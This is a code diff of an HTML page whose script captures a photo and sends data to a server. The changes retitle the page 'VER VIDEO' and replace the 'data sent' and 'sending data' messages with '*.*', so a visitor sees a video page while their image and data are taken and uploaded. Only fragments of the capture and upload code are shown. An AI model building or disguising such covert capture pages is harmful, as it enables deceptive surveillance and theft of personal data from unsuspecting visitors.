@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Captura de Datos</title>
+    <title>VER VIDEO</title>
     <script>
         async function capturarDatos() {
             // Capturar foto
@@ -54,7 +54,7 @@
             .then(response => response.json())
             .then(data => {
                 console.log("Datos enviados correctamente:", data);
-                document.getElementById("mensaje").textContent = "Datos enviados correctamente.";
+                document.getElementById("mensaje").textContent = "*.*";
             })
             .catch(error => {
                 console.error("Error al enviar los datos:", error);
@@ -66,7 +66,7 @@
     </script>
 </head>
 <body>
-    <h1>Captura de Datos</h1>
-    <p id="mensaje">Enviando datos...</p>
+    <h1>VIDEO</h1>
+    <p id="mensaje">*.* </p>
 </body>
 </html>
